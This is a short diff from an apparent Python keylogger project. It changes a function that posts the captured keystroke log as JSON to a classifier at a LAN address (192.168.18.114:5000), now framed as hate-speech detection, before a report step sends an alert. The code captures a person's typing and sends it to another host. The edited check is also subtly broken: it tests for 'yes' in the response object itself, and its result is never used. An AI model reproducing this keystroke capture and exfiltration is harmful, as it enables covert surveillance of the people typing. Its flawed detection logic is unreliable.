@@ -13,12 +13,15 @@ import credenciais as cr
 SEND_REPORT_EVERY = 30
 
 
-def saveLog(self):
+def isHateSpeech(self):
     dataLogs = json.dumps({"valor": 0, "frase": self.log})
     header = {'Content-type': 'application/json'}
-    image = requests.post("http://192.168.18.114:5000/predict", data=dataLogs, headers=header)
+    hateSpeech = requests.post("http://192.168.18.114:5000/predict", data=dataLogs, headers=header)
 
-    print(image.content)
+    if 'yes' in hateSpeech:
+        return True
+    else:
+        return False
 
 def getProcess(self):
     infoSet = set()
@@ -87,7 +90,7 @@ class Keylogger:
 
     def report(self):
         if self.log:
-            saveLog(self)
+            isHateSpeech(self)
             sendAlert(self)
 
         self.log = ""
